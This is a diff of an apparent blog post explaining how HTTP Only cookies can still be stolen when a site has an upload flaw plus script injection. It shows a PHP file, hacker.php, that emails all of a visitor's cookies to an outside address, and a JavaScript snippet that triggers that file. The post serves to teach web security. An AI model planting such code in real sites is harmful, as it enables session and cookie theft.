@@ -16,11 +16,11 @@ With most things, one single mechanism isn't the only way to secure your website
 
 It's still possible to steal HTTP Only cookies from your website. It's just not that easy and requires multiple vulnerabilities in your code - not just client side script injection.
 
-### How to Steal HTTP Only Cookie
+## How to Steal HTTP Only Cookie
 
 Let's look at our code that sets our cookie in our PHP server / backend application.
 
-**`index.php`**
+{{< filename-header "index.php" >}}
 ```php
 <?php
 setcookie('my-cookie', 'the value', 0, "", "", false, true);
@@ -32,7 +32,7 @@ The last `true` indicates that we want to have this cookie as HTTP Only.  To ver
 
 Next, we need to have a vulnerability that allows users to upload PHP scripts.  You might say "well if they can access PHP, they can already do a bunch of other things anyway!"  That's not true. You might have your user uploads properly secluded from the rest of your application.  Let's create a PHP file that we trick into the user uploads to run as an application.  (For this contrived example, it'll be a plain PHP file. It's possible with other vulnerabilities and misconfigurations to get image files to run as PHP, etc.)
 
-**`/uploads/uuid-here/hacker.php`**
+{{< filename-header "/uploads/uuid-here/hacker.php" >}}
 ```php
 <?php
 mail('hacker@gmail.com', 'An HTTP only cookie', var_export($_COOKIE, true));
@@ -55,6 +55,6 @@ var i = new Image();
 i.src="/uploads/uuid-here/hacker.php";
 ```
 
-### End Notes
+## End Notes
 
 Again, like I said, it's not easy. It would require two vulnerabilities or misconfigurations. However, it _is_ possible to steal an HTTP Only cookie.
